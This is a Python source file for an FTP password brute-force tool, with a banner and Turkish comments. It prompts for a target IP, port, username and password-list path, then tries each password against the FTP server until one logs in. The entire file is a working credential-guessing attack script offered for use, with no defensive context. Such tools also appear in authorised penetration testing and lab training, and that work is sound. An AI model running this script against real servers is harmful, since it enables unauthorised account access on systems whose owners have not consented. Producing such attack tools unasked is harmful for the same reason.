import ftplib
import os
import time

os.system("clear")

print(r"""
  ___                           
 | _ ) __ _ _ _  __ _ _ _  __ _ 
 | _ \/ _` | ' \/ _` | ' \/ _` |
 |___/\__,_|_||_\__,_|_||_\__,_|

""")

# Target IP al
target = input("📍 Target IP: ")

# 4 haneli port iste
while True:
    port_input = input("📡 Target Port (4-digit, e.g. 2221): ")
    if not port_input.isdigit() or len(port_input) != 4:
        print("❌ Please enter a valid 4-digit port (1000–9999).")
        continue
    port = int(port_input)
    if 1000 <= port <= 9999:
        break
    else:
        print("❌ Port must be between 1000 and 9999.")

# Kullanıcı adı al, boşsa anonymous
username = input("👤 FTP Username (leave blank for anonymous): ")
if username.strip() == "":
    username = "anonymous"

# Parola listesi tercihi
choice = input("📂 Use ready-made passlist.txt? (y/n): ").lower()

if choice == "y":
    passlist_path = "passlist.txt"
else:
    passlist_path = input("📁 Type your password list path: ")

# Parola listesini yükle
try:
    with open(passlist_path, "r", encoding="utf-8", errors="ignore") as file:
        passwords = file.read().splitlines()
except FileNotFoundError:
    print(f"❌ Password list not found at '{passlist_path}'")
    exit()

print(f"\n🚀 Starting FTP brute-force on {target}:{port} as {username} with {len(passwords)} passwords...\n")

# Parola deneme döngüsü
for password in passwords:
    try:
        ftp = ftplib.FTP()
        ftp.connect(target, port, timeout=5)
        ftp.login(user=username, passwd=password)
        print(f"\n✅ Success! Username: {username} | Password: {password}")
        ftp.quit()
        break
    except ftplib.error_perm:
        print(f"🔍 Trying password: {password:<30} ❌ Incorrect")
    except Exception as e:
        print(f"⚠️ Error: {e}")
        break
    time.sleep(0.1)

else:
    print("\n❌ Password not found in list.")
